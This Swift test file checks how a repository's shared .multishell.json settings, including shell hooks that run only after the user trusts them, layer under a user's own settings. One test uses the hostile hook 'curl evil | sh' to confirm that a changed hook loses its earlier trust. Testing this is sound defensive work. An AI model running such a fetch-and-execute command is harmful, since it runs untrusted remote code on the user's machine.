import Foundation
import Testing

@testable import MultishellCore

/// The repository's `.multishell.json`, and how it layers under the user's
/// own settings.
@Suite
struct SharedProjectSettingsTests {
  private func decode(_ json: String) throws -> SharedProjectSettings {
    try JSONDecoder().decode(SharedProjectSettings.self, from: Data(json.utf8))
  }

  @Test func everyFieldIsOptionalAndAWrongTypeCostsThatFieldOnly() throws {
    let shared = try decode(
      #"{ "branchPrefix": "team/", "iconTint": "blue", "postCreateHook": ["npm"], "iconGlyph": "🚀" }"#
    )
    #expect(shared.branchPrefix == "team/")
    #expect(shared.iconTint == nil && shared.postCreateHook == nil)
    #expect(shared.iconGlyph == "🚀")
    #expect(try decode("{}") == SharedProjectSettings())
    #expect(throws: DecodingError.self) { try decode("[1, 2]") }
  }

  @Test func blankStringsReadAsAbsent() throws {
    let shared = try decode(#"{ "worktreeDirectory": "  ", "preCreateHook": "" }"#)
    #expect(shared.worktreeDirectory == nil && shared.preCreateHook == nil)
    #expect(!shared.hasHooks)
  }

  @Test func theHooksTextNamesEachHookSoADecisionIsAboutExactlyThose() {
    let one = SharedProjectSettings(postCreateHook: "npm ci")
    #expect(one.hooksText == "post-create:\nnpm ci")
    let two = SharedProjectSettings(postCreateHook: "npm ci", preDeleteHook: "exit 1")
    #expect(two.hooksText == "post-create:\nnpm ci\n\npre-delete:\nexit 1")
    #expect(one.hooksText != two.hooksText, "adding a hook is a new question")
    #expect(SharedProjectSettings(branchPrefix: "x/").hooksText == nil)
  }

  @Test func loadReturnsNilForARepositoryWithoutTheFileAndThrowsForABrokenOne() throws {
    let root = URL(fileURLWithPath: NSTemporaryDirectory())
      .appendingPathComponent("ms-shared-\(UUID().uuidString)", isDirectory: true)
    try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: root) }

    #expect(try SharedProjectSettings.load(from: root) == nil)
    try #"{ "branchPrefix": "team/" }"#.write(
      to: SharedProjectSettings.file(in: root), atomically: true, encoding: .utf8)
    #expect(try SharedProjectSettings.load(from: root)?.branchPrefix == "team/")
    try "not json".write(
      to: SharedProjectSettings.file(in: root), atomically: true, encoding: .utf8)
    #expect(throws: (any Error).self) { try SharedProjectSettings.load(from: root) }
  }

  @Test func theUsersValuesWinAndTheFileFillsWhatTheyLeftBlank() {
    let shared = SharedProjectSettings(
      worktreeDirectory: "../trees", branchPrefix: "team/", defaultBranch: "develop",
      postCreateHook: "npm ci", iconGlyph: "hammer", iconTint: 4)
    let blank = ProjectSettings().layered(over: shared)
    #expect(blank.worktreeDirectory == "../trees" && blank.branchPrefix == "team/")
    #expect(blank.defaultBranch == "develop", "a repository may name the branch it merges into")
    #expect(blank.iconGlyph == "hammer" && blank.iconTint == 4)
    #expect(blank.postCreateHook == "", "hooks wait for trust")

    let own = ProjectSettings(
      branchPrefix: "me/", defaultBranch: "trunk", postCreateHook: "make", iconTint: 1,
      sharedHooks: SharedHooksDecision(hooks: shared.hooksText!, trusted: true)
    ).layered(over: shared)
    #expect(own.worktreeDirectory == "../trees", "left blank, so the file's")
    #expect(own.branchPrefix == "me/" && own.iconTint == 1)
    #expect(own.defaultBranch == "trunk", "the user's name stands over the file's")
    #expect(own.postCreateHook == "make", "the user's hook stands over the file's")

    #expect(
      ProjectSettings(branchPrefix: "me/").layered(over: nil)
        == ProjectSettings(branchPrefix: "me/"))
  }

  /// A repository may ship what its worktrees open, so a team gets the same
  /// setup without each person finding the settings. Unlike a hook, this
  /// runs nothing the repository wrote: it starts the shell or the agent
  /// the user themselves chose, so it needs no trust decision.
  @Test func aRepositoryMaySayWhatItsWorktreesOpenAndTheUsersOwnAnswerWins() throws {
    let shared = try decode(
      #"{ "autoStartAgent": true, "autoStartAgentOnCreate": true, "opensTerminalOnSelect": false, "opensTerminalOnCreate": true }"#
    )
    #expect(shared.autoStartAgent == true && shared.autoStartAgentOnCreate == true)
    #expect(shared.opensTerminalOnSelect == false && shared.opensTerminalOnCreate == true)

    let blank = ProjectSettings().layered(over: shared)
    #expect(blank.autoStartAgent == true && blank.autoStartAgentOnCreate == true)
    #expect(blank.opensTerminalOnSelect == false && blank.opensTerminalOnCreate == true)

    let own = ProjectSettings(autoStartAgent: false, opensTerminalOnSelect: true)
      .layered(over: shared)
    #expect(own.autoStartAgent == false, "the user's off stands over the file's on")
    #expect(own.opensTerminalOnSelect == true)
    #expect(own.autoStartAgentOnCreate == true, "left alone, so the file's")

    let exported = SharedProjectSettings(exporting: blank)
    #expect(exported.autoStartAgentOnCreate == true && exported.opensTerminalOnSelect == false)
  }

  @Test func aRepositoryMaySayWhatOrderItsWorktreesListInAndTheUsersOwnWins() throws {
    let shared = try decode(
      #"{ "worktreeSortOrder": "committedNewestFirst", "showsActiveWorktreesFirst": true }"#)
    #expect(shared.worktreeSortOrder == .committedNewestFirst)
    #expect(shared.showsActiveWorktreesFirst == true)

    let blank = ProjectSettings().layered(over: shared)
    #expect(blank.worktreeSortOrder == .committedNewestFirst, "the gap the user left")
    #expect(blank.showsActiveWorktreesFirst == true)

    let own = ProjectSettings(
      worktreeSortOrder: .alphabetical, showsActiveWorktreesFirst: false
    ).layered(over: shared)
    #expect(own.worktreeSortOrder == .alphabetical, "the user's choice stands over the file's")
    #expect(own.showsActiveWorktreesFirst == false)

    // What Export writes back out, so a round trip through the file keeps
    // the order the project is actually using.
    let exported = SharedProjectSettings(exporting: blank)
    #expect(exported.worktreeSortOrder == .committedNewestFirst)
    #expect(exported.showsActiveWorktreesFirst == true)
    let written = try decode(String(decoding: try JSONEncoder().encode(exported), as: UTF8.self))
    #expect(written == exported)
  }

  /// An order a newer build named, or a typo someone committed, must not
  /// cost the rest of the file or override the user's own choice.
  @Test func anOrderTheBuildDoesNotKnowCostsThatKeyOnly() throws {
    let shared = try decode(
      #"{ "worktreeSortOrder": "byMergeState", "branchPrefix": "team/" }"#)
    #expect(shared.worktreeSortOrder == nil)
    #expect(shared.branchPrefix == "team/")
    #expect(ProjectSettings().layered(over: shared).worktreeSortOrder == nil, "follows the global")

    let wrongType = try decode(#"{ "worktreeSortOrder": 3 }"#)
    #expect(wrongType.worktreeSortOrder == nil)
    let wrongFlag = try decode(
      #"{ "showsActiveWorktreesFirst": "yes", "worktreeSortOrder": "createdOldestFirst" }"#)
    #expect(wrongFlag.showsActiveWorktreesFirst == nil)
    #expect(wrongFlag.worktreeSortOrder == .createdOldestFirst, "the good key survives")
  }

  /// The raw values travel in a committed file, so they are part of its
  /// format: this pins every one of them, and fails if a case is renamed
  /// rather than added.
  @Test func theStoredNamesAreTheFileFormat() {
    #expect(
      WorktreeSortOrder.allCases.map(\.rawValue) == [
        "alphabetical", "createdNewestFirst", "createdOldestFirst", "committedNewestFirst",
        "committedOldestFirst",
      ])
  }

  @Test func aFlagOfTheWrongTypeCostsThatFlagOnly() throws {
    let shared = try decode(#"{ "autoStartAgent": "yes", "opensTerminalOnCreate": false }"#)
    #expect(shared.autoStartAgent == nil)
    #expect(shared.opensTerminalOnCreate == false)
  }

  /// Copying duplicates files the checkout already has and runs nothing,
  /// so it is not part of the hook question and applies straight away.
  @Test func aRepositoryMaySayWhatNewWorktreesAreGivenWithoutBeingTrusted() throws {
    let shared = try decode(#"{ "copiedPaths": ".env\n.env.local" }"#)
    #expect(!shared.hasHooks, "a copy list is not a hook and is not asked about")
    #expect(ProjectSettings().layered(over: shared).copiedPaths == ".env\n.env.local")
    let own = ProjectSettings(copiedPaths: ".env")
    #expect(own.layered(over: shared).copiedPaths == ".env", "the user's list wins whole")
    #expect(ProjectSettings(copiedPaths: " ").layered(over: shared).copiedPaths == " ")
  }

  @Test func sharedHooksRunOnlyWhenTrustedAndOnlyWhileTheTextIsTheOneTrusted() {
    let shared = SharedProjectSettings(postCreateHook: "npm ci", preDeleteHook: "exit 1")
    let text = shared.hooksText!
    let asked = ProjectSettings()
    #expect(asked.needsHookDecision(for: shared) && !asked.trustsHooks(of: shared))

    let trusted = ProjectSettings(sharedHooks: SharedHooksDecision(hooks: text, trusted: true))
    #expect(trusted.trustsHooks(of: shared) && !trusted.needsHookDecision(for: shared))
    let layered = trusted.layered(over: shared)
    #expect(layered.postCreateHook == "npm ci" && layered.preDeleteHook == "exit 1")
    #expect(layered.preCreateHook == "", "a hook the file does not have stays blank")

    let declined = ProjectSettings(sharedHooks: SharedHooksDecision(hooks: text, trusted: false))
    #expect(!declined.trustsHooks(of: shared) && !declined.needsHookDecision(for: shared))
    #expect(declined.layered(over: shared).postCreateHook == "")

    let changed = SharedProjectSettings(postCreateHook: "curl evil | sh", preDeleteHook: "exit 1")
    #expect(!trusted.trustsHooks(of: changed), "a changed hook is not the one trusted")
    #expect(trusted.needsHookDecision(for: changed), "and is asked about again")
  }

  @Test func aWhitespaceOnlyHookOfTheUsersTurnsTheFilesOff() {
    let shared = SharedProjectSettings(postCreateHook: "npm ci")
    let optedOut = ProjectSettings(
      postCreateHook: " ", sharedHooks: SharedHooksDecision(hooks: shared.hooksText!, trusted: true)
    ).layered(over: shared)
    #expect(optedOut.postCreateHook == " ", "kept as the user's none, not replaced")
  }
}

@Suite
struct ProjectNameTests {
  @Test func aBareRepositoryIsNamedWithoutItsSuffixOrByTheFolderThatHidesIt() {
    #expect(Project(path: URL(fileURLWithPath: "/w/demo")).name == "demo")
    #expect(Project(path: URL(fileURLWithPath: "/w/demo.git")).name == "demo")
    #expect(Project(path: URL(fileURLWithPath: "/w/demo/.bare")).name == "demo")
    #expect(Project(path: URL(fileURLWithPath: "/w/demo/.git")).name == "demo")
  }
}
